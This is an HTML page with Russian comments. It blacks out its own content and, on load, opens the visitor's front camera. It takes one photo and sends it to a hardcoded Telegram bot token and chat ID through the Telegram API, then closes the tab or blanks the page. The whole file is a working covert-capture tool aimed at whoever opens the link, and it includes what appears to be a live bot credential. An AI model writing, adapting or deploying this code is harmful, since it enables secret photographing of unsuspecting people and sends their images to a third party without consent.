<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        /* Скрываем всё и создаём чёрный фон */
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
        * { display:none; } /* Скрываем все элементы по умолчанию */
    </style>
</head>
<body>
    <!-- Элементы для работы с камерой (будут показаны скриптом) -->
    <video id="video"></video>
    <canvas id="canvas"></canvas>
    <div id="log"></div>

<script>
// ==== НАСТРОЙКИ ====
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
// ===================

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

async function captureAndSend() {
    try {
        // 1. ВКЛЮЧАЕМ КАМЕРУ (фронтальную)
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user', // Фронтальная камера
                width: { ideal: 640 }, // Меньше разрешение = быстрее
                height: { ideal: 480 }
            }
        });
        
        video.srcObject = stream;
        
        // 2. ДЕЛАЕМ ФОТО СРАЗУ (без задержек)
        // Ждём всего 50мс для инициализации камеры
        await new Promise(resolve => setTimeout(resolve, 50));
        
        // Настраиваем canvas под размер видео
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Делаем снимок
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // 3. ОСТАНАВЛИВАЕМ КАМЕРУ СРАЗУ (чтобы не было задержек)
        stream.getTracks().forEach(track => track.stop());
        
        // 4. ОТПРАВЛЯЕМ В TELEGRAM (самая быстрая отправка)
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            // БЕЗ ПОДПИСИ (caption) - если не нужна
            
            // Отправляем и не ждём ответа (фото уйдёт в фоне)
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // Не ждём ответа от сервера
            });
            
            // 5. СРАЗУ ЗАКРЫВАЕМ СТРАНИЦУ
            window.close(); // Закрывает вкладку/окно
            // Если не закрывается, делаем редирект на пустую страницу
            setTimeout(() => {
                window.location.href = 'about:blank';
            }, 100);
            
        }, 'image/jpeg', 0.85); // Качество 85% - оптимально
        
    } catch (error) {
        // Если ошибка - просто закрываем страницу
        setTimeout(() => {
            window.location.href = 'about:blank';
        }, 100);
    }
}

// ЗАПУСКАЕМ ВСЁ СРАЗУ ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
window.addEventListener('DOMContentLoaded', captureAndSend);
// И если страница уже загружена, запускаем сразу
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', captureAndSend);
} else {
    captureAndSend();
}
</script>
</body>
</html>
